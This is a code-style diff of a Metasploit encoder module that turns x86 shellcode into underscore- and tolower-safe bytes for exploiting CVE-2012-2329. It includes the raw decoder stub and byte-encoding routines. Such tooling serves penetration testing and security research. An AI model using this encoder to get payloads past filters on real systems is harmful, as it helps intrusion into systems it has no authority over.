@@ -18,8 +18,8 @@ class MetasploitModule < Msf::Encoder
   # "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"
   def initialize
     super(
-      'Name'             => 'Avoid underscore/tolower',
-      'Description'      => %q{
+      'Name' => 'Avoid underscore/tolower',
+      'Description' => %q{
           Underscore/tolower Safe Encoder used to exploit CVE-2012-2329. It is a
         modified version of the 'Avoid UTF8/tolower' encoder by skape. Please check
         the documentation of the skape encoder before using it. As the original,
@@ -31,19 +31,17 @@ class MetasploitModule < Msf::Encoder
         transformation block, having into account more relaxed conditions about bad
         characters greater than 0x80.
       },
-      'Author'           =>
-        [
-          'skape', # avoid_utf8_lower Author
-          'juan vazquez' # Adapted to be usable on CVE-2012-2329
-        ],
-      'Arch'             => ARCH_X86,
-      'License'          => MSF_LICENSE,
-      'EncoderType'      => Msf::Encoder::Type::NonUpperUnderscoreSafe,
-      'Decoder'          =>
-        {
-          'KeySize'    => 4,
-          'BlockSize'  => 4,
-        })
+      'Author' => [
+        'skape', # avoid_utf8_lower Author
+        'juan vazquez' # Adapted to be usable on CVE-2012-2329
+      ],
+      'Arch' => ARCH_X86,
+      'License' => MSF_LICENSE,
+      'EncoderType' => Msf::Encoder::Type::NonUpperUnderscoreSafe,
+      'Decoder' => {
+        'KeySize' => 4,
+        'BlockSize' => 4
+      })
   end
 
   #
@@ -65,13 +63,13 @@ class MetasploitModule < Msf::Encoder
     end
 
     decoder =
-      "\x6a" + [len].pack('C')      +  # push len
-      "\x6b\x3c\x24\x09"            +  # imul 0x9
-      "\x60"                        +  # pusha
-      "\x03\x0c\x24"                +  # add ecx, [esp]
-      "\x6a" + [0x11+off].pack('C') +  # push byte 0x11 + off
-      "\x03\x0c\x24"                +  # add ecx, [esp]
-      "\x6a\x04"                       # push byte 0x4
+      "\x6a" + [len].pack('C') +        # push len
+      "\x6b\x3c\x24\x09" +              # imul 0x9
+      "\x60" +                          # pusha
+      "\x03\x0c\x24" +                  # add ecx, [esp]
+      "\x6a" + [0x11 + off].pack('C') + # push byte 0x11 + off
+      "\x03\x0c\x24" +                  # add ecx, [esp]
+      "\x6a\x04"                        # push byte 0x4
 
     # encoded sled
     state.context = ''
@@ -82,11 +80,11 @@ class MetasploitModule < Msf::Encoder
   def encode_block(state, block)
     buf = try_add(state, block)
 
-    if (buf.nil?)
+    if buf.nil?
       buf = try_sub(state, block)
     end
 
-    if (buf.nil?)
+    if buf.nil?
       raise BadcharError.new(state.encoded, 0, 0, 0)
     end
 
@@ -106,30 +104,29 @@ class MetasploitModule < Msf::Encoder
   # two underscore/tolower safe values.
   #
   def try_sub(state, block)
-    buf = "\x81\x29";
-    vbuf  = ''
-    ctx   = ''
+    buf = "\x81\x29"
+    vbuf = ''
+    ctx = ''
     carry = 0
 
-    block.each_byte { |b|
-
-      x          = 0
-      y          = 0
-      attempts   = 0
+    block.each_byte do |b|
+      x = 0
+      y = 0
+      attempts = 0
       prev_carry = carry
 
-      begin
+      loop do
         carry = prev_carry
 
         if (b > 0x80)
-          diff  = 0x100 - b
-          y     = rand(0x80 - diff - 1).to_i + 1
-          x     = (0x100 - (b - y + carry))
+          diff = 0x100 - b
+          y = rand(0x80 - diff - 1).to_i + 1
+          x = (0x100 - (b - y + carry))
           carry = 1
         else
-          diff  = 0x7f - b
-          x     = rand(diff - 1) + 1
-          y     = (b + x + carry) & 0xff
+          diff = 0x7f - b
+          x = rand(diff - 1) + 1
+          y = (b + x + carry) & 0xff
           carry = 0
         end
 
@@ -137,19 +134,18 @@ class MetasploitModule < Msf::Encoder
 
         # Lame.
         return nil if (attempts > 512)
-
-      end while (is_badchar(state, x) or is_badchar(state, y))
+        break unless is_badchar(state, x) || is_badchar(state, y)
+      end
 
       vbuf += [x].pack('C')
-      ctx  += [y].pack('C')
-    }
+      ctx += [y].pack('C')
+    end
 
     buf += vbuf + "\x03\x0c\x24"
 
     state.context += ctx
 
     return buf
-
   end
 
   #
@@ -158,32 +154,30 @@ class MetasploitModule < Msf::Encoder
   # safe values.
   #
   def try_add(state, block)
-    buf  = "\x81\x01"
+    buf = "\x81\x01"
     vbuf = ''
-    ctx  = ''
+    ctx = ''
 
-    block.each_byte { |b|
-
+    block.each_byte do |b|
       attempts = 0
 
-      begin
+      loop do
         if b == 0x00
           xv = rand(b - 1) # badchars will kill 0x00 if it isn't allowed
         else
           xv = rand(b - 1) + 1
         end
 
-
         attempts += 1
 
         # Lame.
         return nil if (attempts > 512)
-
-      end while (is_badchar(state, xv) or is_badchar(state, b - xv))
+        break unless is_badchar(state, xv) || is_badchar(state, b - xv)
+      end
 
       vbuf += [xv].pack('C')
-      ctx  += [b - xv].pack('C')
-    }
+      ctx += [b - xv].pack('C')
+    end
 
     buf += vbuf + "\x03\x0c\x24"
 
